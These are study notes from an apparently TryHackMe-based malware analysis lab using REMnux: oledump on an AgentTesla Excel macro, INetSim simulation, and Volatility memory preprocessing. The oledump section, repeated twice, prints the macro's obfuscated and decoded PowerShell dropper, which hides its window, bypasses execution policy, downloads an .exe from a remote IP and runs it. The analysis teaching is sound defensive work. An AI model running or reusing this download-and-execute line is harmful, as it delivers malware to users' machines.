# REMnux.md

## REMux is a Malware analysis based Linus ditstro that can be found here: https://remnux.org/

### From Cybersecurity101 on THM // 

In this task, we will use oledump.py to conduct static analysis on a potentially malicious Excel document. 

Oledump.py is a Python tool that analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format. 
OLE stands for Object Linking and Embedding, a proprietary technology developed by Microsoft. 
OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. 
This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

Let's start!
Using the virtual machine attached to task 2, the REMnux VM, navigate to the /home/ubuntu/Desktop/tasks/agenttesla/ directory. Our target file is named agenttesla.xlsm. 
Run the command oledump.py agenttesla.xlsm. See the terminal below.

Terminal
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
 Based on OleDump's file analysis, a VBA script might be embedded in the document and found inside xl/vbaProject.bin. 
 Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index) +Numbers are called data streams. 

Now, we should be aware of the data stream with the capital letter M. This means there is a Macro, and you might want to check out this data stream, 'VBA/ThisWorkbook'.

So, let's check it out! Let's run the command oledump.py agenttesla.xlsm -s 4. 
This command will run the oledump and look into the actual data stream of interest using the parameter -s 4,  wherein the -s parameter is short for -select  and the number four(4) as the data stream of interest is in the 4th place(A4: M 688 'VBA/ThisWorkbook')

Terminal
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
View Results
The results above are in hex dump format. There might be some familiar words from a trained eye. 
However, this is still challenging for us, don't you think? So, let's make it more readable and easier to understand.

We will run an additional parameter --vbadecompress in addition to the previous command.
When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format, making it easier to analyze the contents of the macros.

Terminal
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
View Results
This is much better, isn't it?
 Now, we don't need to be able to read the whole script but rather familiarize ourselves with some characters and commands. 
 Our interest here would be the value of Sqtnew because if you check the script, there is a Public IP, a PDF, and a .exe inside. We might want to look into this further.

Terminal
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")

We will copy the first value of Sqtnew and paste it into CyberChef's input area. You can open a local copy of CyberChef inside the REMnux VM or go to this link to access the online version. 
Use whichever works for you. 
You might want to check our room about CyberChef to get more familiar with the tool.

Next, select the Find/Replace operation twice. 
Looking back at the script, the 2nd and 3rd values of Sqtnew have a command to replace * with "" and ^ with "". 
We would assume that the "" means there is no value. So, with our first operation selected, we put the value * and selected SIMPLE STRING as additional parameters. 
In contrast, we did not put anything on the Replace box or have any value.  
The same applies to our second operation: we put the value ^ and selected SIMPLE STRING, and the replace box has no value. See the image below.

CyberChef using Find/Replace twice to fix PowerShell script.

Now, this is more readable! However, for our starters, this can be challenging. So, we will tackle the most basic commands here.

Terminal
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
Let's break it down!

So, in PowerShell, running the -WindowStyle parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, hidden means that the PowerShell window won’t be visible to the user.
By default, PowerShell restricts script execution for security reasons. The -executionpolicy parameter allows you to override this policy. The bypass means that the execution policy is temporarily ignored, allowing any script to run without restriction.
The Invoke-WebRequest is commonly used for downloading files from the internet.
The -Uri Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource Doc-3737122pdf.exe from http://193.203.203.67/rt/.
The -OutFile specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.
The Start-Process is used to execute the downloaded file that is stored in $TempFile after the web request.
To summarize, when the document agenttesla.xlsm is opened, a Macro will run! This Macro contains a VBA script. 
The script will run and will be running a PowerShell to download a file named Doc-3737122pdf.exe from http://193.203.203.67/rt/, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (Doc-3737122pdf.exe). This is a usual technique used by threat actors to avoid early detection. Pretty nasty, right?!

# File Analysis

Oledump.py is a Python tool that analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format. OLE stands for Object Linking and Embedding, a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

Let's start!
Using the virtual machine attached to task 2, the REMnux VM, navigate to the /home/ubuntu/Desktop/tasks/agenttesla/ directory. Our target file is named agenttesla.xlsm. Run the command oledump.py agenttesla.xlsm. See the terminal below.

Terminal
ubuntu@10.10.64.16:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
 Based on OleDump's file analysis, a VBA script might be embedded in the document and found inside xl/vbaProject.bin. Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index) +Numbers are called data streams. 

Now, we should be aware of the data stream with the capital letter M. This means there is a Macro, and you might want to check out this data stream, 'VBA/ThisWorkbook'.

So, let's check it out! Let's run the command oledump.py agenttesla.xlsm -s 4. This command will run the oledump and look into the actual data stream of interest using the parameter -s 4,  wherein the -s parameter is short for -select  and the number four(4) as the data stream of interest is in the 4th place(A4: M 688 'VBA/ThisWorkbook')

Terminal
ubuntu@10.10.64.16:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
View Results
The results above are in hex dump format. There might be some familiar words from a trained eye. However, this is still challenging for us, don't you think? So, let's make it more readable and easier to understand.

We will run an additional parameter --vbadecompress in addition to the previous command. When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format, making it easier to analyze the contents of the macros.

Terminal
ubuntu@10.10.64.16:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
View Results
This is much better, isn't it?
 Now, we don't need to be able to read the whole script but rather familiarize ourselves with some characters and commands. Our interest here would be the value of Sqtnew because if you check the script, there is a Public IP, a PDF, and a .exe inside. We might want to look into this further.

Terminal
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")

We will copy the first value of Sqtnew and paste it into CyberChef's input area. You can open a local copy of CyberChef inside the REMnux VM or go to this link to access the online version. Use whichever works for you. You might want to check our room about CyberChef to get more familiar with the tool.

Next, select the Find/Replace operation twice. Looking back at the script, the 2nd and 3rd values of Sqtnew have a command to replace * with "" and ^ with "". We would assume that the "" means there is no value. So, with our first operation selected, we put the value * and selected SIMPLE STRING as additional parameters. In contrast, we did not put anything on the Replace box or have any value.  The same applies to our second operation: we put the value ^ and selected SIMPLE STRING, and the replace box has no value. See the image below.

CyberChef using Find/Replace twice to fix PowerShell script.

Now, this is more readable! However, for our starters, this can be challenging. So, we will tackle the most basic commands here.

Terminal
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
Let's break it down!

So, in PowerShell, running the -WindowStyle parameter allows you to control how the PowerShell window appears when executing a script or command. 
In this case, hidden means that the PowerShell window won’t be visible to the user.
By default, PowerShell restricts script execution for security reasons. The -executionpolicy parameter allows you to override this policy. 
The bypass means that the execution policy is temporarily ignored, allowing any script to run without restriction.
The Invoke-WebRequest is commonly used for downloading files from the internet.
The -Uri Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource Doc-3737122pdf.exe from http://193.203.203.67/rt/.
The -OutFile specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.
The Start-Process is used to execute the downloaded file that is stored in $TempFile after the web request.
To summarize, when the document agenttesla.xlsm is opened, a Macro will run! This Macro contains a VBA script. 
The script will run and will be running a PowerShell to download a file named Doc-3737122pdf.exe from http://193.203.203.67/rt/, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (Doc-3737122pdf.exe). This is a usual technique used by threat actors to avoid early detection.
Pretty nasty, right?!

# INetSim

During dynamic analysis, it is essential to observe the behaviour of potentially malicious software—especially its network activities. There are many approaches to this. 
We can create a whole infrastructure, a virtual environment with different core machines, and more. Alternatively, there is a tool inside our REMnux VM called INetSim: 
Internet Services Simulation Suite!

We will utilize INetSim's features to simulate a real network in this task.


Virtual Machines
For this task, we will use two (2) machines. The first is our REMnux machine, which is linked to the Machine Access Task. The second VM is the AttackBox. To start the AttackBox, click the blue Start AttackBox button at the top of the page. Do note that you can easily switch between boxes by clicking on them. See the highlighted box in the below image.

 This image shows how you can switch between the machines that were loaded. At the bottom of the screenshot, you will notice the names of the machines. 
 Just click on the name of the machine you want to open. Select the other name of the VM should you wish to switch to the other machine


INetSim
Before we start, we must configure the tool INetSim inside our REMnux VM. Do not worry; this is a simple change of configuration. First, check the IP address assigned to your machine. This can be seen using the command ifconfig or simply by checking the IP address after the ubuntu@ from the terminal. The IP addresses may vary.

Terminal
ubuntu@10.10.64.16:~$
Here, the machine’s IP is 10.10.64.16. Take note of this, as we will need it.

Next, we need to change the INetSim configuration by running this command sudo nano /etc/inetsim/inetsim.conf and look for the value #dns_default_ip 0.0.0.0.

Terminal
ubuntu@10.10.64.16:~$ sudo nano /etc/inetsim/inetsim.conf
#########################################
/# dns_default_ip
/#
/# Default IP address to return with DNS replies
/#
/# Syntax: dns_default_ip 
/#
/# Default: 127.0.0.1
/#
/#dns_default_ip  0.0.0.0
Remove the comment or #, then change the value of dns_default_ip from 0.0.0.0 to the machine’s IP address you have identified earlier. In our case, this is 10.10.64.16. 
Save the file using CRTL + O command, press enter and exit using CTRL + X.

Confirm that the changes have been successful by checking the value of dns_default_ip using this command cat /etc/inetsim/inetsim.conf | grep dns_default_ip. 
See below.

Terminal
ubuntu@10.10.64.16:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip
/# dns_default_ip
/# Syntax: dns_default_ip 
dns_default_ip	 10.10.64.16

Finally, run the command sudo inetsim to start the tool.

Terminal
ubuntu@10.10.64.16:~$ sudo inetsim
INetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg
Using log directory:      /var/log/inetsim/
Using data directory:     /var/lib/inetsim/
Using report directory:   /var/log/inetsim/report/
Using configuration file: /etc/inetsim/inetsim.conf
Parsing configuration file.
Warning: Unknown option '/var/log/inetsim/report/report.104162.txt#start_service' in configuration file '/etc/inetsim/inetsim.conf' line 43
Configuration file parsed successfully.
=== INetSim main process started (PID 4859) ===
Session ID:     4859
Listening on:   10.10.64.16
Real Date/Time: 2024-09-22 17:38:22
Fake Date/Time: 2024-09-22 17:38:22 (Delta: 0 seconds)
 Forking services...
  * dns_53_tcp_udp - started (PID 4863)
  * http_80_tcp - failed!
  * https_443_tcp - started (PID 4865)
  * ftps_990_tcp - started (PID 4871)
  * pop3_110_tcp - started (PID 4868)
  * smtp_25_tcp - started (PID 4866)
  * ftp_21_tcp - started (PID 4870)
  * pop3s_995_tcp - started (PID 4869)
  * smtps_465_tcp - started (PID 4867)
 done.
Simulation running.
After running the command, ensure you see the sentence "Simulation running" at the bottom of the result and ignore the http_80_tcp—failed!
 Our fake network is now running!

Let's move on to our AttackBox!


AttackBox
From this VM, open a browser and go to our REMnux's IP address using the command https://10.10.64.16. 
This will prompt a Security Risk; ignore it, click Advance, then Accept the Risk and Continue.

 This image demonstrate the instructions mentioned where in you should click on Advance, then proceed to Accept the Risk and Continue.

Once done, you should be redirected to the INetSim's homepage!

This image shows the output or the desired result when the tool INetSim is started without any issues

One usual malware behaviour is downloading another binary or script. We will try to mimic this behaviour by getting another file from INetsim. 
We can do this via the CLI or browser, but let's use the CLI to make it more realistic. Use this command: sudo wget https://10.10.64.16/second_payload.zip --no-check-certificate.

Terminal
root@10.10.64.16:~# sudo wget https://10.10.64.16/second_payload.zip --no-check-certificate
--2024-09-22 22:18:49--  https://10.10.64.16/second_payload.zip
Connecting to 10.10.64.16:443... connected.
WARNING: cannot verify 10.10.64.16's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u2018MACHINE_IP\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018second_payload.zip\u2019

second_payload.zip  100%[===================>]     258  --.-KB/s    in 0s      

2024-09-22 22:18:49 (14.5 MB/s) - \u2018second_payload.zip\u2019 saved [258/258]

You can try downloading another file as well. For example, try downloading second_payload.ps1 by using the command:sudo wget https://10.10.64.16/second_payload.ps1 --no-check-certificate.

To verify that the files were downloaded, check your root folder. See the sample below.

 This image shows the result of downloading the files as instructed. You should be able to see similar to what is shown from this image. 
 There should be two files downloaded namely second_payload.zip and second_payload.ps1

All of these are fake files! Try to open the second_payload.ps1. When executed, this will direct you to INetSim's homepage.

What we did here is mimic a malware's behaviour, wherein it will try to reach out to a server or URL and then download a secondary file that may contain another malware.


Connection Report
Lastly, go back to your REMnux VM and stop INetSim. By default, it will create a report on its captured connections. 
This is usually saved in /var/log/inetsim/report/ directory. You should be able to see something like this.

Terminal
Report written to '/var/log/inetsim/report/report.2594.txt' (14 lines)
=== INetSim main process stopped (PID 2594) ===

Read the file using this command sudo cat /var/log/inetsim/report/report.2594.txt. This may differ from your machine.

Terminal
ubuntu@10.10.64.16:~$ sudo cat /var/log/inetsim/report/report.2594.txt
=== Report for session '2594' ===

Real start date            : 2024-09-22 21:04:42
Simulated start date       : 2024-09-22 21:04:42
Time difference on startup : none

2024-09-22 21:04:53  First simulated date in log file
2024-09-22 21:04:53  HTTPS connection, method: GET, URL: https://10.10.64.16/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:16:07  HTTPS connection, method: GET, URL: https://10.10.64.16/test.exe, file name: /var/lib/inetsim/http/fakefiles/sample_gui.exe
2024-09-22 21:18:37  HTTPS connection, method: GET, URL: https://10.10.64.16/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  HTTPS connection, method: GET, URL: https://10.10.64.16/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  Last simulated date in log file

These are the logs when the tool was running. We can see the connections made to the URL, the protocol, and the method it's using.
We can also see the fake file that was downloaded.

# Memory Inspection

## Memory Investigation: Evidence Preprocessing
One of the most common investigative practices in Digital Forensics is the preprocessing of evidence. This involves running tools and saving the results in text or JSON format. The analyst often relies on tools such as Volatility when dealing with memory images as evidence. This tool is already included in the REMnux VM. Volatility commands are executed to identify and extract specific artefacts from memory images, and the resulting output can be saved to text files for further examination. Similarly, we can run a script involving the tool's different parameters to preprocess the acquired evidence faster.


## Preprocessing With Volatility
In this task, we will use the Volatility 3 tool version. However, we won’t go deep into the investigation and analysis part of the result—we could write a whole book about it! Instead, we want you to be familiar with and get a feel for how the tool works. Run the command as instructed and wait for the result to show. Each plugin takes 2-3 minutes to show the output.

Here are some of the parameters or plugins we will use. We will focus on Windows plugins.

windows.pstree.PsTree
windows.pslist.PsList
windows.cmdline.CmdLine
windows.filescan.FileScan
windows.dlllist.DllList
windows.malfind.Malfind
windows.psscan.PsScan
Let’s get started then!

In your RemnuxVM, run sudo su, then navigate to /home/ubuntu/Desktop/tasks/Wcry_memory_image/ directory, and our file would be wcry.mem. We will run each plugin after the command vol3 -f wcry.mem.


### PsTree
This plugin lists processes in a tree based on their parent process ID.

Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pstree.PsTree
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
View Results

### PsList
This plugin is used to list all currently active processes in the machine.

Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pslist.PsList
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
View Results

### CmdLine
This plugin is used to list process command line arguments.

Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.cmdline.CmdLine
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
View Results

### FileScan
This plugin scans for file objects in a particular Windows memory image. The results have more than 1,400 lines.

Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.filescan.FileScan
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
View Results

### DllList
This plugin lists the loaded modules in a particular Windows memory image. Due to a text limitation, this one won't have a View Results icon.

Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.dlllist.DllList
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished

### PsScan
This plugin is used to scan for processes present in a particular Windows memory image.

Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.psscan.PsScan
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
View Results

### Malfind
This plugin is used to lists process memory ranges that potentially contain injected code. There won't be any View Results icon for this one due to text limitation.
Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.malfind.Malfind
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished

For more information regarding other plugins, you may check this link.

Now, you have the plugins running individually and seeing the result. What you will do now is process this in bulk. Remember, one of the investigative practices involves preprocessing evidence and saving the results to text files, right? The question is how?

The answer? Do a loop statement! See the command below.

Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
Let’s break this command down, shall we?

We created a variable named $plugin with values of each volatility plugin
Then ran vol3 parameters -q, which means quiet mode or does not show the progress in the terminal
And -f, which means read from the memory capture.
The plugin > wcry.plugin.done; means run volatility with the plugins and output it to a file with wcry at the beginning of the text, followed by the name of the plugins and with an extension of .txt. Repeat until the value of variable $plugin is used.
After running the command, you won't see any output from the terminal; you'll see files within the same directory where you ran the command.

This image shows the desired output of running the command from the instructions. 
You should be able to see seven text files generated from running the loop statement


Preprocessing With Strings
Next, we will preprocess the memory image with the Linux strings utility. We will extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings. See the command below.

Terminal
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings wcry.mem > wcry.strings.ascii.txt
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt
root@10.10.64.16:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt
The strings command extracts printable ASCII text. The -e l option tells strings to extract 16-bit little endian strings. 
The -e b option tells strings to extract 16-bit big endian strings.
All three string formats can provide useful information about the system under investigation.

https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html
